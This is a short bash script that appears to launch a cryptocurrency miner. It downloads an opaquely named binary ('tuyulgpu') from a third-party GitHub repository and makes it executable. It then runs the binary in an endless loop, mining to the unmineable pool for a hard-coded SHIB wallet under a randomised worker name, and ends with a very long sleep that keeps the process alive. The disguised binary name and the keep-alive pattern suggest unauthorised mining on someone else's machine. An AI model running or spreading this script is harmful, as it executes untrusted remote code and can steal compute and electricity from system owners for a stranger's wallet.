#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
wget https://github.com/skullCANDe/hick/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
